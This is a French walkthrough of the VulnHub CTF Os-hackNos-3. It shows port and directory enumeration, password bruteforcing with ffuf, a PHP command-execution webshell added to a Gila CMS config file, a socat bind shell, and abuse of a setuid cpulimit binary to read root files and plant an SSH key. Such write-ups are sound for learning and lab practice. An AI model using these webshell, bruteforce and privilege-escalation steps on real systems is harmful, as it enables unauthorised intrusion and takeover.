# Solution du CTF Os-hackNos-3 de VulnHub

Présentation du CTF
-------------------

[Os-hackNos-3](https://www.vulnhub.com/entry/hacknos-os-hacknos-3,410/) fait partie d'une série de CTF proposé sur VulnHub et créé par [Rahul Gehlaut](https://twitter.com/rahul_gehlaut).  

Le challenge se présente comme étant de difficulté intermédiaire. C'est un boot2root sous Linux avec deux flags (utilisateur non privilégié puis root) à récupérer.  

Un scan TCP révèle deux ports ouverts :  

```plain
Nmap scan report for 192.168.2.10
Host is up (0.00013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ce:16:a0:18:3f:74:e9:ad:cb:a9:39:90:11:b8:8a:2e (RSA)
|   256 9d:0e:a1:a3:1e:2c:4d:00:e8:87:d2:76:8c:be:71:9a (ECDSA)
|_  256 63:b3:75:98:de:c1:89:d9:92:4e:49:31:29:4b:c0:ad (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: WebSec
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 08:00:27:42:25:E5 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Une énumération web est souvent une étape obligée dans les CTF :  

```plain
$ feroxbuster -u http://192.168.2.10/ -w raft-large-directories.txt -n -t 20

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.2.10/
 🚀  Threads               │ 20
 📖  Wordlist              │ raft-large-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      314c http://192.168.2.10/scripts
403        9l       28w      277c http://192.168.2.10/server-status
200        9l       20w      195c http://192.168.2.10/
[####################] - 16s    62260/62260   0s      found:3       errors:0
```

Le dossier *scripts* ici n'a pas été la révélation qu'on espérait. Il s'agit de scripts qui semblent liés à un outil de management d'issues (sorte de bug tracker) à ce que j'ai conclus d'une recherche mais aucun de ces scripts ne semble avoir des vulnérabilités connues.  

Une énumération sur les noms de fichiers remonte en revanche le script *upload.php* présent à la racine. Celui ci retourne une page vide. Si on estime qu'il attend un champ d'upload de fichier envoyé via POST alors on peut réaliser un bruteforce sur le nom de ce nom de champ et espérer obtenir une réponse différente (message d'erreur ou de succès) quand on aura trouvé le bon.  

```python
import requests

sess = requests.session()
with open("common_query_parameter_names.txt", encoding="utf-8", errors="ignore") as fd:
    for line in fd:
        field = line.strip()

        data = {"submit": "Upload"}
        files = {
            field: ("yolo.png", b"PNGnevermindthebollocks", "image/png")
        }

        response = sess.post(
            "http://192.168.2.10/upload.php",
            data=data,
            files=files
        )

        if response.text.strip():
            print(f"Got a response with field {field}: {response.text}")
```

Malheureusement à la fin de l'exécution aucun cas trouvé ni de fichier qui aurait été effectivement été uploadé sur le site :(   

Devant la faiblesse de ces résultats un œil plus attentif sur la page d'index s'impose. On y trouve ainsi le message suivant :   

> find the Bug. You need extra WebSec

Le dernier mot étant en gras je tente ma chance sur l'URL */websec* et je me retrouve face à une mire de login. Un petit coup d’œil à la source révèle le nom de la webapp utilisée :  

```html
<meta name="generator" content="Gila CMS">
```

On trouve sur *exploit-db* plusieurs exploits pour cette application malheureusement les vulnérabilités mentionnés nécessitent une authentification ou alors ne semblent pas exploitables ici.  

Sans compter que l'on ne dispose pas ici de la version de l'application. Un nouveau *feroxbuster* sur le dossier ne remontant aucun *README* ou autre *ChangeLog*.  

Bruteforce ?
------------

A priori il ne nous reste plus qu'à trouver une paire username / password valide pour l'application. Le site web mentionne *contact@hacknos.com*. Je peux donc tenter de bruteforcer le mot de passe de cet utilisateur (la mire de login demande un email) avec la wordlist *rockyou*.  

J'ai utilisé *ffuf* pour la première fois sur cet usage bien précis et je me suis aperçu (d'abord via les résultats et après avec Wireshark) que ce dernier ne rajoute pas par défaut le bon content-type pour la requête. Il faut donc le spécifier quand on bruteforce un POST :  

```bash
$ ffuf -w rockyou.txt -X POST -d "username=contact@hacknos.com&password=FUZZ" -H "Content-type: application/x-www-form-urlencoded" -u http://192.168.2.10/websec/admin -fr Wrong
```

Le filtre *-fr* permet d'exclure les pages qui auraient un certain pattern dans leur contenu.  

J'ai fait de même avec *admin@hacknos.com* qu'il semblait réaliste d'essayer aussi.  

Petit détail amusant : si on tente de bruteforcer depuis un navigateur on déclenche au bout d'un moment un mécanisme de protection, protection qui n’apparaît pas via *ffuf* car il ne tient pas compte des cookies définis par l'appli web :p  

Là encore, point de résultats :(   

Comme j'avais précédemment tilté sur la typo *Securityx* qui apparaissait sur la page */websec* je l'ai tout simplement essayé comme mot de passe et cela m'a ouvert la porte avec l'email *contact@hacknos.com*.  

Webshell
--------

L'accès récupéré permet de voir la version du *Gila* : 1.10.9  

Pour autant, une fois de plus, pas de vulnérabilités réellement exploitables. L'appli dispose d'un gestionnaire de fichier avec une fonction d'upload mais je ne suis pas parvenu à trouver de dossier avec les permissions d'écriture.  

On peut toutefois éditer un fichier et j'ai jeté mon dévolu sur le fichier *config.php*.  

On trouve d'ailleurs dans ce fichier les identifiants pour la base de données :  

```php
$GLOBALS['config'] = array (
  'db' => 
  array (
    'host' => 'localhost',
    'user' => 'cmsu',
    'pass' => 'securityx',
    'name' => 'cms',
  ),
```

J'ai rajouté ces instructions à la fin du fichier :  

```php
if (isset($_GET["cmd"])) { system($_GET["cmd"]); }
```

Je n'ai pas compris comment accéder directement au fichier *config.php* (quelle est son URL) mais un fichier de ce type doit être inclus dans à peu près toutes les pages de l'application. Effectivement il m'aura suffit d'appeler *http://192.168.2.10/websec/?cmd=id* pour avoir l'exécution de commande attendue :  

```plain
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Le système ne semble pas d'humeur à nous fournir d'un reverse shell mais, comme vu dans le scan de port du début, les ports sont fermés, non filtrés donc un classique *bind* suffira. J'ai utilisé *socat* qui était sur la machine.  

Sur le serveur : 
```bash
socat -d -d TCP4-LISTEN:4443 EXEC:/bin/bash
```

En local : 
```bash
socat - TCP4:192.168.2.10:4443
```

Une fois connecté, je repère un utilisateur sur le système :  

```plain
blackdevil:x:1000:118:hackNos:/home/blackdevil:/bin/bash
```

Le flag se trouve dans le fichier *user.txt* de son home : 
```plain
bae11ce4f67af91fa58576c1da2aad4b
```

Il fait partie du groupe Docker ce qui peut être intéressant pour passer à root ensuite : 
```plain
uid=1000(blackdevil) gid=118(docker) groups=118(docker),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lxd)
```

Mais je ne trouve rien d'utile pour passer du user actuel *www-data* à cet utilisateur. J'ai juste une entrée sudo qui pointe vers un path improbable (ça trolle):   

```plain
$ sudo -l
Matching Defaults entries for www-data on hacknos:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on hacknos:
    (www-data) NOPASSWD: /not/easy/What/are/you/looking
```

LinEnum me remonte un fichier Dockerfile sur le système qui correspond en fait à la mise en place du Gila :  

```plain
[-] Anything juicy in the Dockerfile:
-rwxr-xr-x 1 www-data www-data 639 Jul 10  2019 /var/www/html/websec/Dockerfile
```

```plain
FROM ubuntu:18.04

RUN apt-get -y update
RUN apt-get -y install apache2

ENV TZ=America/Mexico_City
ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get -y install php php-json php-mysql php-mbstring php-zip php-gd
RUN a2enmod rewrite
RUN apt-get -y install wget zip unzip
RUN wget https://github.com/GilaCMS/gila/archive/master.zip
RUN unzip master.zip
RUN mv gila-master/* /var/www/html
RUN mv gila-master/.htaccess /var/www/html
RUN chmod 777 -R /var/www/html
RUN rm /var/www/html/index.html
RUN apt-get clean

EXPOSE 80
COPY tests/scripts/000-default.conf /etc/apache2/sites-available/000-default.conf
CMD ["apache2ctl", "-D", "FOREGROUND"]
```

SetUID : le biloute (le petit bit) qui vous veut du bien
--------------------------------------------------------

Il y a aussi cette liste de binaires setuid qui est rémontée :  

```plain
     1607     24 -rwsr-xr-x   1 root     root               22840 Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1
     1365     52 -rwsr-xr--   1 root     messagebus         51184 Jun 11  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1373     16 -rwsr-xr-x   1 root     root               14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
     7628    116 -rwsr-sr-x   1 root     root              117672 Aug 30  2019 /usr/lib/snapd/snap-confine
     1597    444 -rwsr-xr-x   1 root     root              453096 Sep 12  2019 /usr/lib/openssh/ssh-keysign
      816     56 -rwsr-xr-x   1 root     root               55528 Aug 21  2019 /usr/bin/mount
      862     68 -rwsr-xr-x   1 root     root               67992 Aug 29  2019 /usr/bin/passwd
      560     84 -rwsr-xr-x   1 root     root               84848 Aug 29  2019 /usr/bin/chfn
      830     44 -rwsr-xr-x   1 root     root               44600 Aug 29  2019 /usr/bin/newgrp
    17037     32 -rwsr-xr-x   1 root     root               31424 Jul  6  2019 /usr/bin/cpulimit
      685     88 -rwsr-xr-x   1 root     root               88272 Aug 29  2019 /usr/bin/gpasswd
     1156     40 -rwsr-xr-x   1 root     root               39144 Aug 21  2019 /usr/bin/umount
     1086     68 -rwsr-xr-x   1 root     root               67816 Aug 21  2019 /usr/bin/su
     1087    160 -rwsr-xr-x   1 root     root              161448 Oct 15  2019 /usr/bin/sudo
      671     36 -rwsr-xr-x   1 root     root               34896 Mar  5  2019 /usr/bin/fusermount
      492     56 -rwsr-sr-x   1 daemon   daemon             55560 Nov 12  2018 /usr/bin/at
      883     32 -rwsr-xr-x   1 root     root               31032 Aug 16  2019 /usr/bin/pkexec
      566     48 -rwsr-xr-x   1 root     root               48784 Aug 29  2019 /usr/bin/chsh
```

Tout me semblait très standard à première vue mais à regarder de plus près *cpulimit* sonne nouveau.  

Je ne le trouve pas sur mes systèmes mais [une page de manuel en ligne](https://manpages.ubuntu.com/manpages/xenial/man1/cpulimit.1.html) me renseigne sur les capacités de cet utilitaire.  

Ce dernier permet d'exécuter un programme tout en limitant d’emblée l'usage qu'il va faire du CPU, super !  

Quelques exemples sont présents dans le manuel comme celui-ci :  

```bash
$ cpulimit -l 20 firefox
Launch Firefox web browser and limit its CPU usage to 20%
```

Si on appelle la commande *id* via *cpulimit* on obtient cet output :  

```plain
cpulimit -l 50 id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
Process 7570 detected
```

Effectivement l'effective UID est root, ce qui est propre aux binaires setuid mais l'exécutable n'appelant pas ensuite les fonctions setuid/setgid on ne pourra pas obtenir un shell avec les accès que l'on souhaite.  

On peut toutefois profiter de cet effective UID pour passer les restrictions sur les fichiers :  

```plain
$ cpulimit -l 50 -- ls -al /root
total 56
drwx------  8 root root 4096 Dec 14  2019 .
drwxr-xr-x 20 root root 4096 Dec 10  2019 ..
-rw-------  1 root root  162 Dec 14  2019 .bash_history
-rw-r--r--  1 root root 3106 Aug 27  2019 .bashrc
drwx------  2 root root 4096 Dec 13  2019 .cache
drwxr-xr-x  3 root root 4096 Dec 13  2019 .composer
drwx------  3 root root 4096 Dec 13  2019 .gnupg
drwxr-xr-x  3 root root 4096 Dec 13  2019 .local
-rw-r--r--  1 root root  148 Aug 27  2019 .profile
drwx------  2 root root 4096 Dec 10  2019 .ssh
-rw-------  1 root root 6581 Dec 13  2019 .viminfo
-rw-r--r--  1 root root  547 Dec 13  2019 root.txt
drwxr-xr-x  3 root root 4096 Dec 10  2019 snap
Process 13629 detected
```

On peut ainsi récupérer le flag *root.txt* :  

```plain
########    #####     #####   ########         ########  
##     ##  ##   ##   ##   ##     ##            ##     ## 
##     ## ##     ## ##     ##    ##            ##     ## 
########  ##     ## ##     ##    ##            ########  
##   ##   ##     ## ##     ##    ##            ##   ##   
##    ##   ##   ##   ##   ##     ##            ##    ##  
##     ##   #####     #####      ##    ####### ##     ##

MD5-HASH: bae11ce4f67af91fa58576c1da2aad4b

Author: Rahul Gehlaut

Blog: www.hackNos.com

Linkedin: https://in.linkedin.com/in/rahulgehlaut
```

Et si vraiment on souhaite avoir un shell root on passera une fois de plus par le fichier *authorized\_keys* :  

```bash
echo "ssh-rsa --ma-cle-publique-ssh--" > authorized_keys
cpulimit -l 50 -- mkdir /root/.ssh
cpulimit -l 50 -- cp authorized_keys /root/.ssh/
```

Finalement :  

```bash
ssh root@192.168.2.10
Enter passphrase for key '/home/devloop/.ssh/id_rsa': 
Last login: Sat Dec 14 00:21:20 2019
root@hacknos:~# id
uid=0(root) gid=0(root) groups=0(root)
```


*Published November 24 2021 at 18:04*